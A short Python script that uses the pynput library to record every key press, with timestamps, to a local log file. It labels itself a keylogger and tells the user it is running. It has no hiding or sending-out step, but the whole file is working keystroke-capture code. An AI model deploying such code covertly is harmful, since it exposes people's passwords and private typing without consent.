from pynput import keyboard
import logging
from datetime import datetime
log_filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

print("Welcome to the keylogger!\nPlease input some keys.")

def press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

with keyboard.Listener(on_press=press) as listener:
    print(f"[INFO] Keylogger started... Logging to: {log_filename}")
    listener.join()
